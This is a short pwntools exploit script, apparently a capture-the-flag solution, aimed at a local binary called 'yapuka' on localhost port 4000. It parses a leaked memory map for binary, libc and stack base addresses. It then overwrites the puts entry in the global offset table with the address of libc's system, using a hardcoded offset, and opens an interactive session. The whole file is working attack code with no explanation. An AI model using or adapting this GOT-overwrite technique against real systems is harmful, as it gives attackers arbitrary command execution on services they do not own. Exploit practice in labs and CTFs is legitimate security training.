from pwn import remote, ELF

p = remote('localhost', 4000, level='debug')

elf = ELF('./yapuka')

p.recvuntil(b'Yapuka!\n')

libc_base = None
stack_base = None
binary_base = None

while True:
    line = p.recvline()
    
    if b"Now you can write once" in line:
        break


    if b"/app/yapuka" in line and binary_base is None:
        binary_base = int(line.split(b'-')[0], 16)

    if b"libc.so.6" in line and libc_base is None:
        libc_base = int(line.split(b'-')[0], 16)

    if b"[stack]" in line and stack_base is None:
        stack_base = int(line.split(b'-')[0], 16)

puts_got = binary_base + elf.got['puts']
system_addr = libc_base + 0x4c490


p.sendline(str(puts_got).encode())
p.sendline(str(system_addr).encode())

p.interactive()
